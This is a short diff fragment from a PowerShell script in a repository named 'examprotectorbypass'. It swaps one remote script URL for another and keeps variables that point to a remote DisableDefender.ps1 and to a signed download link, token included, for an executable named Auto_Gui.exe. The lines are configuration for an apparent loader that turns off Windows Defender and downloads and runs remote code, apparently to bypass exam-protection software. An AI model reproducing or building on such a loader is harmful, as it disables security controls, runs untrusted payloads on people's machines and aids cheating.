@@ -8,7 +8,7 @@
 # ================================================================
 
 # ---- SET THIS TO YOUR RAW GITHUB URL ----
-$myUrl       = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/luncher.ps1"
+$myUrl       = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/auto.ps1"
 $defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"
 
 $etsUrl = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Auto_Gui.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0F1dG9fR3VpLmV4ZSIsInNjb3BlIjoiZG93bmxvYWQiLCJpYXQiOjE3OTAzNTQ5OTMsImV4cCI6MjEwNTcxNDk5M30.Op2kLFe4NTWxy0lh8yaiObbDj6FKUwd0frNWOulB2n8'
